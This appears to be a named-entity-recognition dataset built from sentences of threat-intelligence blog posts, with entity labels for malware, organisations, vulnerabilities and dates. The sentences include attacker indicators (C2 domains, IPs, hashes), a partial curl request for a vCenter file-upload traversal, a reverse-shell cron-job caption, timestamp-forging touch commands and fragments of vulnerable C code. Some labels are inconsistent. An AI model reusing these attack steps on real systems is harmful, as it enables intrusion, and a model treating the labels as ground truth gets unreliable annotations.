detect it might view it as a random home-user threat that accidentally slipped into the corporate network.", {"entities": []}], ["Therefore, it is crucial for users to change their default credentials.", {"entities": []}], ["These changes have made it difficult for anti-virus, IPS, firewalls and file-based sandboxes to keep up with the malware and effectively protect endpoints from infection.", {"entities": []}], ["These malicious email campaign spikes revealed that FireEye appliances, with the support of DTI cloud, were able to provide a full picture of the campaign (blue), while only a fraction of the emailed malware samples could be detected by various Anti-Virus vendors (yellow).", {"entities": [[52, 59, "ORG"]]}], ["These metrics, in combination with the observed swiftness of adversary exploitation activity, highlight the importance of responsible disclosure, as it may provide defenders with the slim window needed to successfully patch vulnerable systems.", {"entities": []}], ["These mitigations do not patch the underlying vulnerability.", {"entities": []}], ["The FortiGuard AntiVirus service detects and blocks this threat as Linux/Mirai and ELF/Mirai Conclusion Through our active monitoring, we encountered a new variant of the Mirai-based botnet campaign referred to as MANGA or Dark.", {"entities": [[4, 14, "ORG"], [171, 176, "Malware_Name"], [214, 219, "Campaign"]]}], ["This JavaScript file ( hxxp://cnbang.net/bugfix.JS in the above example) is remotely controlled by the app developer.", {"entities": []}], ["This Mirai-based Distributed Denial of Service (DDOS) botnet campaign is one that FortiGuard Labs has been actively monitoring .", {"entities": [[5, 10, "Malware_Name"], [82, 97, "ORG"]]}], ["This PlugX payload was configured with the following command-and-control (CnC) domains: java.ns1[.]name adservice.no-ip[.]org wmi.ns01[.]us Sample callback traffic was as follows:", {"entities": [[5, 10, "Malware_Name"]]}], ["This PlugX sample was compiled on Feb. 12, one day before we first observed it, indicating that it was deployed specifically for this campaign.", {"entities": [[5, 10, "Malware_Name"]]}], ["This Poison Ivy variant connected to a CnC server at ids.ns01[.]us.", {"entities": [[5, 15, "Malware_Name"]]}], ["This actor also has early access to a number of zero-day exploits, including Flash and Java, and deploys a variety of malware families on compromised systems.", {"entities": [[48, 56, "Vulnerability"], [77, 82, "Software_Name"]]}], ["This added behavior does not require the app to be rebuilt, nor does it require another review through the App Store.", {"entities": []}], ["This average is slightly inflated by vulnerabilities such as CVE-2019-0863, a Microsoft Windows server vulnerability, which was disclosed in December 2018 and not patched until 5 months later in May 2019.", {"entities": [[78, 87, "ORG"], [141, 154, "DATE"], [195, 203, "DATE"]]}], ["This blog will cover the trends of the campaign, as well as provide a short technical analysis of the payload.", {"entities": []}], ["This code would allow download and execution of a JavaScript patch when the app starts: Figure 2.", {"entities": []}], ["This does not mean, however, that other regions are safe, especially considering the readiness of its creators to collaborate with other cybercriminals.", {"entities": []}], ["This exploit server hosted a Flash exploit file named BrightBalls.swf (MD5 1ec5141051776ec9092db92050192758).", {"entities": [[29, 34, "Software_Name"]]}], ["This exploit, in turn, dropped the Poison Ivy variant.", {"entities": [[35, 45, "Malware_Name"]]}], ["This gives it a higher potential of spreading, making it more prolific than similar botnets.", {"entities": []}], ["This is an attempt for that attacker to not only compromise the server but also clients connecting to it.", {"entities": []}], ["This is the content that gets loaded and executed by JPEngine, the component provided by the JSPatch framework embedded in the target app.", {"entities": []}], ["This jar file exploited CVE-2012-0507 and dropped a Poison Ivy payload with the hash (MD5 52aa791a524b61b129344f10b4712f52).", {"entities": [[52, 62, "Malware_Name"]]}], ["This post details how this threat leverages the new vulnerability to take over the affected devices and ways to protect users from these attacks.", {"entities": []}], ["This post is only a small snapshot of the comprehensive analysis provided in the December Threats Report.", {"entities": []}], ["This process involves communicating with the remote server to retrieve the patch code.", {"entities": []}], ["This seed is different from the previous campaigns.", {"entities": []}], ["This vulnerability was exploited by espionage groups—Russia's APT28 and North Korea's APT37—as well as TEMP.MetaStrike and other financially motivated attackers.", {"entities": [[53, 59, "GPE"], [72, 85, "GPE"]]}], ["This vulnerability was exploited by multiple espionage groups, including Chinese, North Korean, and Russian, groups, as well as Iranian groups APT33 and TEMP.Zagros.", {"entities": [[73, 80, "NORP"], [82, 94, "NORP"], [100, 107, "NORP"], [128, 135, "NORP"]]}], ["This week, security-researchers from Kaspersky discovered that an actor was applying the so-called Process Doppelgänging technique in what has been named the “SynAck” ransomware.", {"entities": [[0, 9, "DATE"], [37, 46, "ORG"], [159, 165, "Malware_Name"]]}], ["This works by reading every string in its code and encrypting it using a hardcoded key.", {"entities": []}], ["Through the FireEye Dynamic Threat Intelligence (DTI) cloud , FireEye Labs discovered that each and every major spike in email blasts brought a change in the attributes of their attack.", {"entities": [[62, 74, "ORG"]]}], ["Throughout its life, this ongoing campaign has been very active in targeting newly discovered vulnerabilities.", {"entities": []}], ["Time Between PoC or Exploit Code Publication and First Observed Potential Exploitation Events Product CVE FireEye Risk Rating 1 day WinRAR CVE-2018-20250 Medium 1 day Drupal CVE-2018-7600", {"entities": [[126, 131, "DATE"], [139, 153, "Vulnerability"], [174, 187, "Vulnerability"]]}], ["Time between vulnerability exploitation and patch issuance ­­­ Time Between Disclosure and Patch Release", {"entities": []}], ["Time to Exploit for Vulnerabilities First Exploited after a Patch Hours Two vulnerabilities were successfully exploited within hours of a patch release, CVE-2018-2628 and CVE-2018-7602.", {"entities": [[171, 184, "Vulnerability"]]}], ["Timeline of activity for CVE-2018-20250 CVE-2018-20250:", {"entities": [[25, 39, "Vulnerability"]]}], ["To accomplish this, the following requests are sent to the device: Request 1: Request 2: It is important to emphasize that this exploitation requires authentication to succeed.", {"entities": []}], ["To change the behavior of the running app, one simply needs to modify the content of this JavaScript blob.", {"entities": []}], ["To prevent your company from falling victim to this Trojan, we recommend that you equip all Internet-facing devices with a high-quality security solution .", {"entities": []}], ["Typical Mutex Generation \\\"2GVWNQJz1\\\" Create svchost.exe process Code injection into svchost.exe Entrenchment Once the dll is running in memory it then creates a copy of itself in the following location: %", {"entities": []}], ["Users may not see a detection alert with some versions of McAfee products under some versions of Windows.", {"entities": [[58, 64, "ORG"]]}], ["Using a DGA domain to host the javascript makes it more resilient against defenses.", {"entities": []}], ["Using passive DNS analysis, we see the domains windows.ddns[.]us and wmi.ns01[.]us both resolved to 76.73.80.188 in mid-2012.", {"entities": []}], ["Using this technique gives the malware writer an ability to run malicious code/executable under the cover of a legitimate executable by using the transaction features of the NTFS filesystem (Windows Transactional NTFS API).", {"entities": [[174, 178, "Process"]]}], ["Visitors to the Peter G. Peterson Institute for International Economics (www.piie[.]com) were redirected to an exploit server hosting this Flash zero-day through a hidden iframe.", {"entities": []}], ["Visual Tools DVR Exploit As noted above, this bot added a new exploit to its arsenal.", {"entities": []}], ["Vulnerability Discovery", {"entities": []}], ["Vulnerability analysis GreedyWonk targets a previously unknown vulnerability in Adobe Flash.", {"entities": [[80, 85, "ORG"]]}], ["We are always working to refine our process and reports.", {"entities": []}], ["We are collaborating with Adobe security on this issue.", {"entities": [[26, 31, "ORG"]]}], ["We are dedicated to listening to our customers to determine what you find important", {"entities": []}], ["We are not providing any meaningful exploit in this blog post, but instead only pointing out the possibilities to avoid low-skilled attackers taking advantage of off-the-shelf exploits.", {"entities": []}], ["We are very excited to present to you new insights and a new format in this report.", {"entities": []}], ["We believe GreedyWonk may be related to a May 2012 campaign outlined by ShadowServer, based on consistencies in tradecraft (particularly with the websites chosen for this strategic Web compromise), attack infrastructure, and malware configuration properties.", {"entities": [[42, 50, "DATE"], [72, 84, "ORG"]]}], ["We believe these numbers to be conservative estimates, as we relied on the first reported exploitation of a vulnerability linked to a specific date.", {"entities": []}], ["We have to thoroughly test to ensure that when we release our solution it detects correctly and does not disrupt or break other software.", {"entities": []}], ["We hope you enjoy the new format, and we welcome your feedback.", {"entities": []}], ["We subsequently found that the American Research Center in Egypt (www.arce[.]org) and the Smith Richardson Foundation (www.srf[.]org) also redirected visitors the exploit server.", {"entities": [[27, 55, "ORG"], [86, 117, "ORG"]]}], ["We’re dubbing this attack “Operation GreedyWonk.”", {"entities": [[27, 47, "Campaign"]]}], ["What Is Protected Windows 7 & 8 -> McAfee protection is effective Win 10 RS3 -> McAfee protection is effective Win 10 RS4 -> Microsoft has implemented the same protection as McAfee EnSilo have documented that attempts to exploit Win 10 Pre RS3 results in a Windows crash, “Blue Screen of Death” (BSOD).", {"entities": [[26, 27, "Version_Tag"], [35, 41, "ORG"], [80, 86, "ORG"], [125, 134, "ORG"], [174, 180, "ORG"], [181, 187, "ORG"]]}], ["What Trickbot can do now The modern Trickbot’s main objective is to penetrate and spread on local networks.", {"entities": []}], ["What’s more, Trickbot is now popular with cybercriminal groups as a delivery vehicle for injecting third-party malware into corporate infrastructure.", {"entities": []}], ["When the bot receives the “ torflood ” command, it uses a set of TOR proxies for its DDOS attacks.", {"entities": []}], ["While malicious email campaigns are nothing new, this one is significant in that we are observing mass-targeting attackers adopting the malware evasion methods pioneered by the stealthier APT attackers.", {"entities": []}], ["While the parse_user_name function remains vulnerable in unpatched Solaris 11.1 and later, unrelated changes to the PAM library truncate the username before the vulnerable function receives it, rendering the issue non-exploitable via SSH.", {"entities": [[67, 74, "Operating_System"], [75, 79, "Version_Tag"], [234, 237, "Protocol"]]}], ["While the process is intended to protect iOS users and ensure apps meet Apple’s standards for security and integrity, developers who have experienced the process would agree that it can be difficult and time consuming.", {"entities": [[41, 44, "Operating_System"], [72, 77, "ORG"]]}], ["While the review process for updated apps often takes less time than the initial submission review, the process can still be time-consuming, unpredictable, and can potentially cause loss of business if app fixes are not delivered in a timely and controlled manner.", {"entities": []}], ["While there is no official public documentation regarding the usage of private frameworks, it is common knowledge that many of them provide private access to low-level system functionalities that may allow an app to circumvent security controls put in place by the OS.", {"entities": []}], ["While these technologies provide a more autonomous development experience, they do not meet the same security standards that Apple has attempted to maintain.", {"entities": [[125, 130, "ORG"]]}], ["While this removes the opportunity to exploit the vulnerability using SSH Keyboard-Interactive authentication, there may be other ways to attack the parse_user_name function and we recommend using this workaround only as a stopgap until Solaris 9 systems can be upgraded, or the October patch can be accessed and installed for supported Solaris versions.", {"entities": [[70, 73, "Protocol"], [237, 244, "Operating_System"], [245, 246, "Version_Tag"], [337, 344, "Operating_System"]]}], ["Wifi.", {"entities": []}], ["With JSPatch, this restriction has no effect because the JavaScript file is not subject to the App Store’s vetting.", {"entities": []}], ["Within 7 days of the release, McAfee Advanced Threat Research started to see the technique being exploited by a Nation State actor.", {"entities": [[7, 13, "DATE"], [30, 61, "ORG"]]}], ["Within 8 days of disclosure, we observed Russia’s APT28 also leverage this vulnerability, with financially motivated attackers and North Korea’s TEMP.Hermit also using within approximately a month of disclosure.", {"entities": [[7, 13, "DATE"], [41, 47, "GPE"], [131, 144, "GPE"], [175, 196, "DATE"]]}], ["Worse, if past is prologue, we can expect other malicious, mass-targeting email operators to adopt this approach to bypass traditional defenses.", {"entities": []}], ["Worse, these methods might be the Achilles heel to the walled garden of Apple’s App Store.", {"entities": [[72, 77, "ORG"]]}], ["Years In multiple cases, such as the first observed exploitation of CVE-2010-1871 and CVE-2012-0874 in 2019, attackers exploited vulnerabilities for which a patch had been made available many years prior.", {"entities": [[68, 81, "Vulnerability"], [86, 99, "Vulnerability"], [103, 107, "DATE"], [187, 203, "DATE"]]}], ["You can call any Objective-C class and method in JavaScript by just including a small engine.", {"entities": []}], ["You can expect more from us, and we welcome your feedback.", {"entities": []}], ["[22, 80, 443, 8081, 8081, 7001]", {"entities": []}], ["[ACAccountStore init] , [ACAccountStore allAccountTypes]", {"entities": []}], ["\\\\0') { if ((*ptr == ' ')", {"entities": []}], ["\\\\t')) break; else { username[index] =", {"entities": []}], ["and KbdInteractiveAuthentication no", {"entities": []}], ["and how we can add value.", {"entities": []}], ["and restart the SSH server.", {"entities": [[16, 19, "Protocol"]]}], ["files found on the compromised server.", {"entities": []}], ["fuckchina.govnb[.]com", {"entities": []}], ["iOS frameworks loaded by the target app Note that the list above – generated from the Apple-approved iOS app binary – does not contain Accounts.framework .", {"entities": [[0, 3, "Operating_System"], [86, 91, "ORG"], [101, 104, "Operating_System"]]}], ["iOS private frameworks are intended to be used solely by Apple-provided apps.", {"entities": []}], ["java.ns1[.]name also resolved to 192.74.246.219 on February 18.", {"entities": [[51, 62, "DATE"]]}], ["no", {"entities": []}], ["windows.ddns.us windows.ddns.us 2012-05-23 2012-05-23 2012-06-10 2012-06-10 76.73.80.188 76.73.80.188", {"entities": [[32, 42, "DATE"], [43, 53, "DATE"], [54, 64, "DATE"], [65, 75, "DATE"]]}], ["wmi.ns01.us 2012-07-07 2012-07-07 2012-09-19 2012-09-19", {"entities": [[12, 22, "DATE"], [23, 33, "DATE"], [34, 44, "DATE"], [45, 55, "DATE"]]}], ["||", {"entities": []}], ["$ ./b -C -y", {"entities": []}], ["&amp;amp;nbsp; How Does It Work?", {"entities": []}], ["(see Figure 2).", {"entities": []}], ["-a $ mv b /usr/lib64/libXbleach.so.1 $ cd /usr/lib64/ $ touch -acm -r librpmio.so.3.2.2 $ touch -acm -rWith the colossal amount of telephone scamming these days, you’d be hard-pressed to find a phone owner anywhere on the planet who hasn’t been a scammer’s target at least once .", {"entities": []}], ["-d “Example” -H “Content-Type: application/json” S teps to recreate attack scenario Create a directory with a test file.", {"entities": []}], ["/.. /.. /.. /.. /.. / tmp /” folder before writing the file “ test2.json” at destination location:", {"entities": [[62, 72, "Filename"]]}], ["10 times icons.exe fills the screen with red Xs final.vbs displays a pop-up message \\\"Bye!\\\" These are the classic actions of joke programs usually intended to annoy or make fun of users.", {"entities": [[9, 18, "Filename"]]}], ["183.136.132.176 183.136.132.170", {"entities": []}], ["188.138.88.184 31.41.47.37 5.34.183.136 91.121.97.170 Beacon Packet", {"entities": []}], ["2.840.10008.1.2.1: A transfer unique ID that defines the value “Explicit VR Little Endian” for data transfer 2.826.0.1.3680043.2.135.1066.101:", {"entities": []}], ["843c17b06a3aee22447f021307909890b68828b9 (February 25) 343ebca579bb888eb8ccb811f9b52280c72e484c (February 25 Malicious documents in the attack.", {"entities": [[42, 53, "DATE"], [97, 108, "DATE"]]}], ["> File System Artifacts", {"entities": []}], [">_", {"entities": []}], ["A PACS setup contains multiple components, including a workstation, imaging device, acquisition gateway, PACS controller, database, and archiving—as illustrated in the following graphic: The basic elements of PACS infrastructure.", {"entities": []}], ["A day later, the threat actor positioned a custom Linux backdoor, which Mandiant named LEMONSTICK, on the same workstation.", {"entities": [[50, 55, "Operating_System"], [72, 80, "ORG"]]}], ["A dynamic API loaded by the malware.", {"entities": []}], ["A few format examples: NifTi Neuroimaging Informatics Technology Initiative Dicom Digital Imaging and Communications in Medicine MINC Medical Imaging NetCDF", {"entities": []}], ["A further three large financial institutions in Turkey were victims of this attack.", {"entities": [[48, 54, "GPE"]]}], ["A quick search revealed more than 1,100 PACS directly connected to the Internet, not behind a recommended layer of network security measures or virtual private networks (VPNs).", {"entities": []}], ["A remote unauthenticated user can create a specially crafted request with malicious code embedded in it that can lead to directory traversal and remote code execution.", {"entities": []}], ["A stack-trace error.", {"entities": []}], ["A subset of the self-decoding approach is emulation, where each assembly instruction execution is emulated.", {"entities": []}], ["A value referring to the implementation class Another value in the banner, “1.4.16/WIN32,” refers to the implementation version.", {"entities": []}], ["APIs from the following libraries are loaded at runtime: Kernel32.dll Ws2_32/wsock32.dll Apvapi32.dll Oleaut32.dll Iphlp.dll Urlmon.dll", {"entities": []}], ["Accessed | /var/tmp/.cache/ocb_static Figure 2: UNC1945 emplacement of SLAPSTICK UNC1945 obtained and maintained access to their external infrastructure using an SSH Port Forwarding mechanism despite the host lacking accessibility to the internet directly.", {"entities": [[48, 55, "Threat_Actor"], [81, 88, "Threat_Actor"]]}], ["According to an April 2020 post on a black-market website, an “Oracle Solaris SSHD Remote Root Exploit” was available for approximately $3,000 USD, which may be identifiable with EVILSUN.", {"entities": [[16, 26, "DATE"]]}], ["Additionally, UNC1945 used built-in utilities and public tools to modify timestamps and selectively manipulate Unix log files.", {"entities": [[14, 21, "Threat_Actor"], [111, 115, "Operating_System"]]}], ["Additionally, Vivisect can emulate and disassemble a series of opcodes, which can help us identify function arguments.", {"entities": []}], ["Additionally, we confirmed a Solaris server exposed to the internet had critical vulnerabilities, which included the possibility of remote exploitation without authentication.", {"entities": []}], ["Advanced Reverse Engineering (FLARE) script series to an invaluable tool for the reverse engineer – the debugger.", {"entities": []}], ["Affected countries", {"entities": []}], ["After a cursory look at the string_decoder function, the arguments are identified as an offset to an encoded string of bytes, an output address, and a length.", {"entities": []}], ["After proving we can decode a string with flare-dbg , let’s automate all calls to the string_decoder function.", {"entities": []}], ["After the affected machine reboots (sometimes it requires a few reboots), the system enters automatic repair mode.", {"entities": []}], ["All are included as metadata with the image.", {"entities": []}], ["Also, we analyzed the Virtual Machine file system timestamps, which coincided with UNC1945's overall operational timeline.", {"entities": []}], ["Alternatively, they might try to trick you into transferring money or even installing a Trojan on your computer, which has been known to happen .", {"entities": [[88, 94, "Malware_Type"]]}], ["Although this is only one part of what the profile provides, many users will find this in itself very useful.", {"entities": []}], ["Although this phrase would not catch the attention of most people, given my research on how cybercriminals are targeting the health care industry , I quickly began to wonder why an ultrasound of our child would not instead save to a file.", {"entities": []}], ["Although we were unable to determine how the late-2018 initial access was accomplished, we did observe successful UNC1945", {"entities": [[45, 54, "DATE"], [114, 121, "Threat_Actor"]]}], ["Always be mindful of executing unknown files received from the internet.", {"entities": []}], ["An alternative and more straightforward option would be to choose Startup Repair on the screen to run the Command Prompt.", {"entities": []}], ["An arbitrary file upload vulnerability has recently been discovered in the Analytics service of VMware vCen t er Server.", {"entities": [[96, 102, "ORG"]]}], ["An example debugger script is shown in Figure 2.", {"entities": []}], ["An example of the DICOM file format.", {"entities": []}], ["An external tool or installer is required if the attacker desires persistence.", {"entities": []}], ["Analyzing Bankshot", {"entities": []}], ["And that ability, in turn, suggests that MisoSMS uses excerpts of publically available code.", {"entities": [[41, 48, "Malware_Name"]]}], ["Another Advanced Option should then let you use the Command Prompt.", {"entities": []}], ["Any user with web access to vCenter server can make use of the analytics endpoints to create arbitrary files at any directory of their choice.", {"entities": []}], ["Approach The first task is to find the string decoder function and get a basic understanding of the inputs and outputs of the function.", {"entities": []}], ["As a result, the traditional signature-based solution may not keep up with the variants where its behavioral intent is the same.", {"entities": []}], ["As an example, following curl request can create a file “ _c_itest.json” with content “ Example” in location “ /var/log/vmware/analytics/prod/” : curl -kv", {"entities": [[111, 142, "Filepath"]]}], ["As seen in Figure 2, the steep spike starts on March 21, 2016, where Locky is running campaigns that coincide with the new Dridex campaigns that were discussed in the blog, “Stop Scanning My Macro”.", {"entities": [[47, 61, "DATE"], [69, 74, "Malware_Name"], [123, 129, "Campaign"]]}], ["As stated in Practical Malware Analysis, there are generally two approaches to deobfuscating strings: self-decoding and manual programming.", {"entities": []}], ["As we investigated these systems, we found that our fears were well founded.", {"entities": []}], ["As we queried, we recorded different responses.", {"entities": []}], ["At the same time, all customers are recommended to update to latest stable version of vCenter as per the advisory released by VMware.", {"entities": [[126, 132, "ORG"]]}], ["At the time of discovery, most of the samples that we see are being detected by only one vendor, according to VirusTotal.", {"entities": [[110, 120, "ORG"]]}], ["At the time, connections from the server to the threat actor IP address were observed over port 8080.", {"entities": []}], ["Bankshot implants are distributed from a domain with a name similar to that of the cryptocurrency-lending platform Falcon Coin, but the similarly named domain is not associated with the legitimate entity.", {"entities": [[0, 8, "Malware_Name"], [115, 126, "ORG"]]}], ["Bankshot implants hosted on falcancoin.io.", {"entities": []}], ["Bankshot is designed to persist on a victim’s network for further exploitation; thus the Advanced Threat Research team believes this operation is intended to gain access to specific financial organizations.", {"entities": [[0, 8, "Malware_Name"]]}], ["Bankshot was first reported by the Department of Homeland Security on December 13, 2017, and has only recently resurfaced in newly compiled variants.", {"entities": [[0, 8, "Malware_Name"], [70, 87, "DATE"]]}], ["Based on analysis of previous samples, this is a unique identifier.", {"entities": []}], ["Based on our analysis, financial organizations in Turkey were targeted via spear phishing emails containing a malicious Microsoft Word document.", {"entities": [[50, 56, "GPE"]]}], ["Based on packet capture analysis of previous implants from 2017, the following strings are used in control server communications:", {"entities": [[59, 63, "DATE"]]}], ["Based on the code similarity, the victim’s business sector, and the presence of control server strings, this attack resembles previous attacks by Hidden Cobra conducted against the global financial network SWIFT.", {"entities": []}], ["Because it has no features for encrypting data demanding a ransom to undo the damage it inflicts, it is instead a new destructive malware variant designed to render affected systems inoperable.", {"entities": []}], ["Because malware reverse engineers love Python, we built our debugger scripting library on top of pykd for Windbg.", {"entities": []}], ["Because much of the imaging equipment in use by medical facilities does not align with security best practices, acquisition gateways are placed in the network to enable the digital exchange of the images.", {"entities": []}], ["Because we are only executing the string decoder function and won’t have the same stack setup as the malware, we must allocate memory for the output string.", {"entities": []}], ["Both Immunity and OllyDbg only support 32-bit applications, and Windbg’s scripting language is specific to Windbg and, therefore, not as well-known.", {"entities": []}], ["Both variants of MisoSMS use the same names for receivers and services.", {"entities": [[17, 24, "Malware_Name"]]}], ["But before that, when first manually running the file, it asks whether the potential victim wants to install Covid-22 on their machine, as if it were an application.", {"entities": [[109, 117, "Malware_Name"]]}], ["But like all forms of cold calling, phone scams are resource-intensive and highly inefficient.", {"entities": []}], ["But the newest rendition adds a few features that make it harder to detect, including a new disguise, encrypted transmissions, and command-and-control (CnC) communications that are handled natively rather than over email.", {"entities": []}], ["But the next activity is not laughable at all.", {"entities": []}], ["But why should we spend so much time and effort in researching vulnerabilities when there are many other ways to retrieve medical images from the Internet?", {"entities": []}], ["By Christiaan Beek on Mar 11, 2018", {"entities": [[3, 18, "PERSON"], [22, 34, "DATE"]]}], ["By Ryan Sherstobitoff on Mar 08, 2018", {"entities": [[3, 21, "PERSON"], [25, 37, "DATE"]]}], ["By skipping the first four bytes, we can decrypt the communications using the key embedded in the native binary.", {"entities": []}], ["By taking a look at its various configurations, Juniper Threat Labs found analytics proxy.conf that defines several API calls specific to telemetry, as shown below: /analytics/telemetry/ph/api/hyper/send /analytics/telemetry/ph/api/level VMware analytics API configuration We also observe d that l ocal and 15080 is configured which should indicate hostname and port used for these APIs.", {"entities": [[48, 67, "ORG"], [307, 312, "Port"]]}], ["CTS:", {"entities": []}], ["Challenge To decode all obfsucated strings, we need to find the following: the string decoder function, each time it is called, and all arguments to each of those instances.", {"entities": []}], ["Check out our video demonstration of some of the features of the profile to see it in action.", {"entities": []}], ["CnC Communication containing stolen SMS[/caption]", {"entities": []}], ["Commands that allow the user to move the cursor to the beginning or end of the current function, to the next or previous “call” instruction, to the previous or next instruction containing the highlighted token, or to a specified number of bytes forward or backwards from the current cursor position help to make voice-controlled navigation easier.", {"entities": []}], ["Conclusion on COVID-22 Brings Disaster to MBR What looks to be a mere joke program is designed to bring destruction to impacted systems.", {"entities": [[14, 22, "Malware_Name"]]}], ["Conclusions The volume of Locky ransomware downloaders observed is increasing and it may potentially replace the Dridex downloader as the top spammer.", {"entities": [[26, 31, "Malware_Name"], [32, 42, "Malware_Type"]]}], ["Configuring the number of opcode bytes to show in IDA Pro's disassembly view Defining a Unicode string in IDA Pro is a multi-step exercise, whether you navigate to the Edit->Strings menu or use the “string literals” keyboard shortcut Alt+A followed by pressing the U key as shown in Figure 2.", {"entities": []}], ["Connection: keep-alive Cache-Control: max-age=0 Accept: */*", {"entities": []}], ["Content-Type: multipart/form-data; boundary= Content-Type: application/octet-stream Accept-Encoding: gzip,deflate,sdch Accept-Language: ko-KR -> Korean Content-Disposition: form-data;name=”board_id” Content-Disposition: form-data;name=”user_id” Content-Disposition: form-data;name=”file1″; filename=”img01_29.jpg” Content-Disposition: form-data;name=”file1″; filename=”my.doc” Content-Disposition: form-data;name=”file1″; filename=”pratice.pdf” Content-Disposition: form-data;name=”file1″; filename=”king.jpg” Content-Disposition: form-data;name=”file1″; filename=”dream.avi” Content-Disposition: form-data;name=”file1″; filename=”hp01.avi” Content-Disposition: form-data;name=”file1″; filename=”star.avi” User Agents", {"entities": []}], ["Covid-22 in Action The malware file is named Covid22.", {"entities": [[45, 52, "Malware_Name"]]}], ["Covid22Server.exe executes the commands in the dropped script.txt lol.vbs creates an endless loop of a MessageBox with \\\"Your PC has been infected by Covid-22 Corona Virus!", {"entities": [[0, 17, "Filename"], [55, 65, "Filename"], [66, 73, "Filename"]]}], ["Create a file in “/ tmp” to check for directory traversal Testing directory traversal", {"entities": []}], ["Creating cron job to obtain reverse shell cron job created at /etc/cron.d", {"entities": []}], ["Currently, you have to open the Options menu, select the General menu item, input a value in the Number of opcode bytes text field, and click the OK button.", {"entities": []}], ["Cursor Movement, Dialogs, and Navigation The cursor movement commands allow the user to move the cursor up, down, left, or right, one or more times, in specified increments.", {"entities": []}], ["DCAB!tr FortiEDR detects the downloaded executable file as malicious based on its behavior.", {"entities": []}], ["DF52!tr W32/BadJoke.", {"entities": []}], ["Darker colors represent more systems.", {"entities": []}], ["Decoded string as comment Conclusion Stay tuned for another debugger scripting series post that will focus on plugins!", {"entities": []}], ["Detection on spam delivered malware Prior to Locky’s emergence in February 2016, Dridex was known to be responsible for a relatively higher volume of email spam campaigns.", {"entities": [[45, 52, "Malware_Name"], [66, 79, "DATE"], [81, 87, "Campaign"]]}], ["Disclosure of information Many of these are ranked on the list of OWASP Top 10 Most Critical Web Application Security Risks list, which highlights severe flaws that should be addressed in any product delivered to a customer.", {"entities": [[66, 71, "ORG"]]}], ["Domain Generation Algorithm (DGA)", {"entities": []}], ["Dridex versus Locky spam campaign over time Locky Ransomware spam The new Locky spam campaign uses several themes such as “invoice notice”, “attached image”, and “attached document themes”.", {"entities": [[0, 6, "Campaign"]]}], ["Dropped files have file names that are simple and self-described for their actions.", {"entities": []}], ["During our investigation, we noticed many small medical practices around the world using free, open-source PACS software, which was not always securely implemented.", {"entities": []}], ["EVILSUN—a remote exploitation tool containing a zero-day exploit for CVE-2020-14871—on a Solaris 9 server.", {"entities": [[69, 83, "Vulnerability"]]}], ["Each data model has been assigned with one unique ID for the C-FIND, one for the C-MOVE, and one for C-GET; so all together there are nine unique IDs, three for each model.", {"entities": []}], ["Each format has different requirements and works with different equipment, protocols, etc.", {"entities": []}], ["Each of these approaches has their place, but this post teaches a way to use debugger scripting to automatically self-decode all obfuscated strings.", {"entities": []}], ["Each of these options isn’t ideal for rapidly creating string decoding debugger scripts.", {"entities": []}], ["Efforts to decrease operational visibility included placing tool and output files within temporary file system mount points that were stored in volatile memory.", {"entities": []}], ["Enjoy the death of your pc!\\\" speakwh.vbs uses the computer's speaker to say \\\"coronavirus\\\" in a loop CoronaPopup.exe displays a pop-up with the title \\\"Covid-22 has infected your pc!\\\" and an image of the actual coronavirus ClutterScreen.exe clutters the screen by constantly moving blocks of pixels x.vbs displays the pop-up message, \\\"Corona Virus!\\\" 50 times noescapes.vbs displays the pop-up message \\\"THERE IS NO ESCAPE\\\"", {"entities": [[103, 118, "Filename"], [226, 243, "Filename"]]}], ["Establish Foothold and Maintain Persistence The threat actor used a Solaris Pluggable Authentication Module backdoor we refer to as SLAPSTICK to establish a foothold on a Solaris 9 server.", {"entities": []}], ["Even now, almost two years after the COVID-19 pandemic started, there is no sign that cybercriminals will stop taking advantage of the situation as an attack vector.", {"entities": [[10, 26, "DATE"]]}], ["Example I wrote a simple piece of malware that hides strings by encoding them.", {"entities": []}], ["Example basic debugger script Let’s break this script down.", {"entities": []}], ["FLARE’s IDA Pro profile for VoiceAttack maps every advertised keyboard shortcut in IDA Pro to a voice command.", {"entities": [[0, 7, "ORG"], [28, 39, "Software_Name"]]}], ["Fake PayPal notification, including the scammers’ phone number, of a “Cryptocurrency (Bitcoin)”", {"entities": [[5, 11, "ORG"]]}], ["Fake PayPal/Amazon purchase confirmations with vishing phone numbers Other, more exotic variants crop up from time to time.", {"entities": [[5, 11, "ORG"], [12, 18, "ORG"]]}], ["Fake notifications about the purchase of Norton and “Kaspersky Total Protection” licenses with vishing phone numbers", {"entities": [[41, 47, "ORG"]]}], ["Figure 1 shows MisoSMS registering a newly infected device with the CnC server.", {"entities": [[15, 22, "Malware_Name"]]}], ["Figure 1 shows an HTTP User-Agent string being decoded by a function I named string_decoder.", {"entities": [[18, 22, "Protocol"]]}], ["Figure 1.", {"entities": []}], ["Figure 10 contains Python code to generate the eight possible domain names for the current date.", {"entities": []}], ["Figure 10.", {"entities": []}], ["Figure 1:", {"entities": []}], ["Figure 1: String decoder function reference in IDA Pro", {"entities": []}], ["Figure 2.", {"entities": []}], ["Figure 2: String literals dialog in IDA Pro Reversing a C++ application?", {"entities": []}], ["Figure 3.", {"entities": []}], ["Figure 4.", {"entities": []}], ["Figure 6.", {"entities": []}], ["Figure 7.", {"entities": []}], ["Figure 8.", {"entities": []}], ["Figure 9.", {"entities": []}], ["File created in /tmp", {"entities": []}], ["FileItem:changed | /usr/lib64/security/pam_unix,so [57720] Audit log |", {"entities": [[19, 47, "Filepath"]]}], ["Finally, we call the string_decoder function at virtual address 0x401000, and read the output string buffer.", {"entities": []}], ["Finally, we run the string_decoder function by using the DebugUtils call function and read the result from our allocated buffer.", {"entities": []}], ["FireEye Labs is detecting a significant spike in Locky ransomware downloaders due to a pair of concurrent email spam campaigns impacting users in over 50 countries.", {"entities": [[49, 54, "Malware_Name"], [55, 65, "Malware_Type"]]}], ["FireEye Labs recently found a more advanced variant of Android.", {"entities": []}], ["FireEye Mobile Threat Prevention customers are already protected from both variants.", {"entities": []}], ["First, choose Advanced Options, Troubleshoot.", {"entities": []}], ["First, we identify the function virtual address of the string decoder function and create a DebugUtils object.", {"entities": []}], ["Folder “ _ c_i” that was created in previous step is important to perform directory traversal , because the process will look for “_ c_i /..", {"entities": []}], ["Follow these guidelines for safety: Do not call back; Log in to your account with the service in question — type the address into your browser; don’t click on any links in the message — and check your orders or recent activity page; Check your balance and the list of recent transactions on all of your cards, if you have reason for concern; Install a reliable antivirus utility with protection against financial attacks, phishing, and online fraud.", {"entities": [[422, 430, "Attack_Type"]]}], ["For a more detailed description of the profile and commands available, see the Github page .", {"entities": []}], ["For example, OllyDbg uses an asm-like scripting language, the Immunity debugger contains a Python 